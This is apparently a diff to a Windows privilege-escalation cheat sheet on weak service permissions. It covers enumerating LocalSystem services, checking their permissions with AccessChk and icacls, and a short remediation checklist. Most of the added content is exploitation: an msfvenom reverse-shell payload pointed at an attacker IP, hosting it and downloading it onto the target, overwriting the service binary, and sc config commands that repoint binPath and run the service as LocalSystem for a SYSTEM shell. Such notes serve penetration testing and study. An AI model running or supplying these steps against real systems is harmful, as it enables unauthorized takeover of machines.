@@ -6,101 +6,163 @@ Windows Privilege Escalation Examples
 <summary>Weak Service Permissions</summary>
  <br> 
 ========================
+In Windows, services running as LocalSystem (highest privilege) with non-default or writable executable paths and weak permissions can be exploited for privilege escalation. This document provides detection, exploitation, and remediation steps.
 
-Writable Service Executables
-----------------------------
+🔍 1. Enumerate Services Running as LocalSystem with Non-Standard Paths
+These services might use custom paths (e.g., C:\Users\Public\svc.exe) instead of the protected default (C:\Windows\System32).
 
-If a services is found which runs as SYSTEM or Administrator level users, and it has weak file permissions, we may be able to replace the service binary, restart the service, and escalate privileges.
+✅ PowerShell:
 
-Use wmic to extract a list of service executables:
+    Get-WmiObject Win32_Service | Where-Object {
+    $_.StartName -eq "LocalSystem" -and
+    $_.PathName -notlike "C:\Windows\System32*"
+    } | Select-Object Name, StartName, PathName
+✅ WMIC:
+cmd
 
-.. code-block:: none
+    wmic service get name,startname,pathname | findstr /i "LocalSystem" | findstr /v /i "C:\\Windows\\System32"
+🔐 2. Check Permissions on Service Configuration
+Use AccessChk to determine whether a user can start, stop, configure, or modify a service.
 
-    for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\services.txt
+✅ Command:
+cmd
 
-If wmic is not available:
+    .\accesschk64.exe /accepteula -uwcqv user servicename
+Look for permissions like:
 
-.. code-block:: none
+Permission	Meaning
+SERVICE_ALL_ACCESS	Full control
+SERVICE_CHANGE_CONFIG	Can change service binary path
+WRITE_DAC / WRITE_OWNER	Can escalate to full control
+GENERIC_WRITE / GENERIC_ALL	Equivalent to full control
+
+📂 3. Identify Writable Service Executables
+✅ Export Executable Paths:
+
+    for /f "tokens=2 delims='='" %a in ('wmic service list full ^| find /i "pathname" ^| find /v /i "system32"') do @echo %a >> C:\Windows\Temp\services.txt
+✅ If wmic is not available:
+cmd
 
     sc query state= all | findstr "SERVICE_NAME:" >> servicenames.txt
     FOR /F "tokens=2 delims= " %i in (servicenames.txt) DO @echo %i >> services.txt
     FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
+✅ Check Permissions:
+cmd
 
-Then use either accesschk.exe, cacls, or icacls to list the access permissions associated with each service executable:
+    for /f "delims=" %a in (C:\Windows\Temp\services.txt) do accesschk.exe /accepteula -qv "%a" >> accesschk.txt
+Or use icacls/cacls:
 
-.. code-block:: none
+    for /f "delims=" %a in (C:\Windows\Temp\services.txt) do icacls "%a" >> icacls.txt
+Look for:
 
-    for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\services.txt) do cmd.exe /c accesschk.exe /accepteula -qv "%a" >> accesschk.txt
+Symbol	Meaning
+(F)	Full Access
+(M)	Modify Access
+(W)	Write Access
+(WDAC)	Write DACL
+(WO)	Write Owner
 
-    for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\services.txt) do cmd.exe /c cacls "%a" >> cacls.txt
+⚙️ 4. Exploitation Steps
+✅ 4.1 Replace the Service Executable
+Generate a reverse shell payload (Metasploit):
 
-    for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\services.txt) do cmd.exe /c icacls "%a" >> icacls.txt
+bash
 
-With accesschk results, look for the following permissions:
+    msfvenom -p windows/powershell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o reverse_priv.exe
+Host it:
 
-.. csv-table::
-    :header: "Permission", "Use Case"
+bash
 
-    "SERVICE_ALL_ACCESS", "Can do anything."
-    "SERVICE_CHANGE_CONFIG", "Can reconfigure the service binary."
-    "WRITE DAC", "Can reconfigure permissions, leading to SERVICE_CHANGE_CONFIG."
-    "WRITE_OWNER", "Can become owner, reconfigure permissions."
-    "GENERIC_WRITE", "Inherits SERVICE_CHANGE_CONFIG"
-    "GENERIC_ALL", "Inherits SERVICE_CHANGE_CONFIG"
+    python3 -m http.server 8999
+Transfer to target:
 
-With cacls and icacls, look for (F)ull Access, (M)odify access, (W)rite-only access, (WDAC) write DAC, or (WO) write owner.
+powershell
 
-Writable Service Objects
-------------------------
+    wget http://<attacker_ip>:8999/reverse_priv.exe -o reverse_priv.exe
+Overwrite service binary:
 
-Use accesschk.exe to find writable service objects:
+powershell
 
-.. code-block:: none
+    copy reverse_priv.exe "C:\Path\To\Service.exe"
+✅ 4.2 Start the Service
+c
+
+    sc start <service>
+Or:
+
+cmd
+
+    net start <service>
+⚡ 5. Writable Service Object Exploitation
+✅ Find Writable Service Objects
+cmd
 
     accesschk.exe /accepteula -uwcqv "Authenticated Users" *
+✅ Update Service Binary Path
+cmd
 
-Query a vulnerable service:
+    sc config <service> binPath= "C:\Path\To\reverse_priv.exe"
+Remove dependencies if blocking:
 
-.. code-block:: none
+cmd
 
-    sc qc <service>
+    sc config <service> depend= ""
+Change service start mode to manual:
 
-Update the service binary path:
+cmd
 
-.. code-block:: none
+    sc config <service> start= demand
+Update service to run as SYSTEM:
 
-    sc config <service> binpath= "<command>"
+c
 
-Update the name of the account which a service runs as:
+    sc config <service> obj= ".\LocalSystem" password= ""
+✅ Start/Stop Service:
+cmd
 
-.. code-block:: none
+    sc stop <service>
+sc start <service>
+Or:
 
-    sc config upnphost obj= ".\LocalSystem" password= ""
-
-Stop / Start a service:
-
-.. code-block:: none
-
-    wmic service <service> call stopservice
-    wmic service <service> call startservice
+cmd
 
     net stop <service>
     net start <service>
+🧪 6. Validate Exploitability
+powershell
 
-    sc stop <service>
-    sc start <service>
+    Get-WmiObject Win32_Service -Filter "Name='<service>'" |
+  Select-Object Name, DisplayName, StartMode, State, StartName, PathName
+🤖 7. Automated Enumeration
+✅ SharpUp
+Use SharpUp.exe for automated privilege escalation checks.
 
-If the service fails to start because of a dependency, you can start the dependency manually, or remove the dependency:
+cmd
 
-.. code-block:: none
+    SharpUp.exe --services
+✅ Summary of Exploit Steps
+Step	Description
+🔍 1	Find services running as LocalSystem with writable paths
+🔐 2	Check if current user can change or control the service
+💣 3	Replace binary with malicious payload
+▶️ 4	Restart or trigger the service to execute payload
+⚡ 5	Get SYSTEM-level shell
 
-    sc config <service> depend= ""
+🔐 Remediation Checklist
+✅ Always install services in C:\Windows\System32
 
-All-in-one comnand:
+✅ Set tight permissions using sc sdset or GPO
 
-.. code-block:: none
+✅ Regularly audit services using:
 
-    sc config <service> binPath= "<command>" depend= "" start= demand obj= ".\LocalSystem" password= ""
+ Sysinternals AccessChk
+
+ PowerUp / SharpUp
+
+✅ Enable AppLocker / Software Restriction Policies
+
+✅ Monitor service creation/modification with Sysmon
+
 </details>
 
 <details>
